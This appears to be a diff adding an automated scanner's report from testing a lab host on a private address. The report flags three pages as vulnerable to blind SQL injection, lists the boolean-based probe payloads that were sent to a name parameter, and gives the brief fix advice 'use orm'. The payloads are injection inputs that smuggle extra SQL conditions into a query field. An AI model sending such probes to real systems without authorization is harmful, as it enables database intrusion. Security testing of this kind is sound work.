@@ -1,0 +1,35 @@
+Target: http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php (GET)
+VulnName: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'36015'='36015
+'	and	'80988'='80988
+'	or	65702=65702#
+'	and	'37090'='37091
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example2.php (GET)
+VulnName: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'36015'='36015
+'	and	'80988'='80988
+'	or	65702=65702#
+'	and	'37090'='37091
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/xml/example2.php (GET)
+VulnName: blind sqli
+Query: {'name': 'hacker'}
+Payload: '+and+'39340'='39340
+'+and+'30780'='30780
+'+or+5413=5413#
+'+and+'96909'='96910
+Advice: use orm
+Database: unknown
+---
